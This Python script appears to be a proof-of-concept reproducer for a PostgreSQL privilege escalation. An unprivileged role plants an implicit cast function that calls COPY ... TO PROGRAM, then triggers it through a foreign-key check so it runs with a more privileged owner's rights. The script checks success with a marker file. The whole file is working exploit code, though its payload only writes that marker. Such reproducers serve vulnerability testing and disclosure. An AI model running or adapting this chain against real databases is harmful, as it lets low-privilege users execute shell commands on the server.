import argparse
import json
import os
import re
import secrets
import shlex
import string
import subprocess
from pathlib import Path


def identifier(value):
    if not re.fullmatch(r"[a-z_][a-z0-9_]{0,62}", value):
        raise SystemExit(f"invalid identifier: {value}")
    return value


def literal(value):
    return "'" + value.replace("'", "''") + "'"


def password():
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(24))


def run_psql(args, database, user, sql, pgpassword=None, ok=True):
    env = os.environ.copy()
    env["PGCONNECT_TIMEOUT"] = str(args.connect_timeout)
    if pgpassword is not None:
        env["PGPASSWORD"] = pgpassword
    command = [
        args.psql,
        "-X",
        "-v",
        "ON_ERROR_STOP=1",
        "-h",
        args.host,
        "-p",
        str(args.port),
        "-U",
        user,
        "-d",
        database,
    ]
    result = subprocess.run(command, input=sql, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
    if ok and result.returncode != 0:
        raise SystemExit(result.stderr.strip() or result.stdout.strip())
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--psql", default="psql")
    parser.add_argument("--host", default=os.environ.get("PGHOST", "127.0.0.1"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("PGPORT", "5432")))
    parser.add_argument("--admin-db", default=os.environ.get("PGDATABASE", "postgres"))
    parser.add_argument("--admin-user", default=os.environ.get("PGUSER", "postgres"))
    parser.add_argument("--admin-password", default=os.environ.get("PGPASSWORD"))
    parser.add_argument("--database", default="ri_cast_probe")
    parser.add_argument("--owner-role", default="ri_owner_probe")
    parser.add_argument("--attacker-role", default="ri_attacker_probe")
    parser.add_argument("--marker", default="/tmp/postgres_ri_cast_marker.txt")
    parser.add_argument("--connect-timeout", type=int, default=5)
    args = parser.parse_args()

    database = identifier(args.database)
    owner = identifier(args.owner_role)
    attacker = identifier(args.attacker_role)
    marker = args.marker
    owner_password = password()
    attacker_password = password()
    command = "cat > " + shlex.quote(marker)
    Path(marker).unlink(missing_ok=True)

    bootstrap = f"""
DROP DATABASE IF EXISTS {database} WITH (FORCE);
DROP ROLE IF EXISTS {attacker};
DROP ROLE IF EXISTS {owner};
CREATE ROLE {owner} LOGIN NOSUPERUSER PASSWORD {literal(owner_password)};
CREATE ROLE {attacker} LOGIN NOSUPERUSER PASSWORD {literal(attacker_password)};
GRANT pg_execute_server_program TO {owner};
CREATE DATABASE {database} OWNER {owner};
"""
    run_psql(args, args.admin_db, args.admin_user, bootstrap, args.admin_password)

    setup = f"""
SET ROLE {owner};
CREATE SCHEMA {owner} AUTHORIZATION {owner};
CREATE TABLE {owner}.pk(id integer PRIMARY KEY);
INSERT INTO {owner}.pk VALUES (7);
GRANT USAGE ON SCHEMA {owner} TO {attacker};
GRANT REFERENCES (id) ON TABLE {owner}.pk TO {attacker};
RESET ROLE;
CREATE SCHEMA {attacker} AUTHORIZATION {attacker};
SET ROLE {attacker};
CREATE TYPE {attacker}.fkkey AS (id integer);
CREATE FUNCTION {attacker}.fkkey_to_int(v {attacker}.fkkey, typmod integer, is_explicit boolean)
RETURNS integer
LANGUAGE SQL
VOLATILE
AS {literal("COPY (SELECT current_user || ':' || session_user || ':' || current_setting('is_superuser')) TO PROGRAM " + literal(command) + "; SELECT (v).id;")};
RESET ROLE;
"""
    run_psql(args, database, args.admin_user, setup, args.admin_password)

    direct = f"SELECT {attacker}.fkkey_to_int(ROW(7)::{attacker}.fkkey, -1, false);"
    direct_result = run_psql(args, database, attacker, direct, attacker_password, ok=False)
    direct_blocked = direct_result.returncode != 0 and "permission denied to COPY to or from an external program" in direct_result.stderr

    trigger = f"""
CREATE CAST ({attacker}.fkkey AS integer)
WITH FUNCTION {attacker}.fkkey_to_int({attacker}.fkkey, integer, boolean)
AS IMPLICIT;
CREATE TABLE {attacker}.fk(id {attacker}.fkkey);
ALTER TABLE {attacker}.fk ADD CONSTRAINT fk_pk FOREIGN KEY (id) REFERENCES {owner}.pk(id);
INSERT INTO {attacker}.fk VALUES (ROW(7)::{attacker}.fkkey);
"""
    insert_result = run_psql(args, database, attacker, trigger, attacker_password)

    marker_path = Path(marker)
    marker_text = marker_path.read_text().strip() if marker_path.exists() else ""
    expected_marker = f"{owner}:{attacker}:off"

    evidence_sql = f"""
SELECT pg_has_role({literal(owner)}, 'pg_execute_server_program', 'USAGE') AS owner_program,
       pg_has_role({literal(attacker)}, 'pg_execute_server_program', 'USAGE') AS attacker_program,
       has_column_privilege({literal(attacker)}, '{owner}.pk', 'id', 'REFERENCES') AS attacker_references,
       has_column_privilege({literal(attacker)}, '{owner}.pk', 'id', 'SELECT') AS attacker_select;
SELECT c.castsource::regtype AS castsource,
       c.casttarget::regtype AS casttarget,
       c.castcontext,
       c.castmethod,
       p.proowner::regrole AS function_owner,
       p.prosecdef
FROM pg_cast c
JOIN pg_proc p ON p.oid = c.castfunc
WHERE c.castsource = '{attacker}.fkkey'::regtype
  AND c.casttarget = 'integer'::regtype;
"""
    evidence_result = run_psql(args, database, args.admin_user, evidence_sql, args.admin_password)

    reproduced = direct_blocked and insert_result.returncode == 0 and marker_text == expected_marker
    print(json.dumps({
        "database": database,
        "owner_role": owner,
        "attacker_role": attacker,
        "direct_function_call_blocked": direct_blocked,
        "insert_returncode": insert_result.returncode,
        "marker": marker_text,
        "expected_marker": expected_marker,
        "reproduced": reproduced,
        "catalog_evidence": evidence_result.stdout.strip(),
    }, indent=2))
    raise SystemExit(0 if reproduced else 1)


if __name__ == "__main__":
    main()
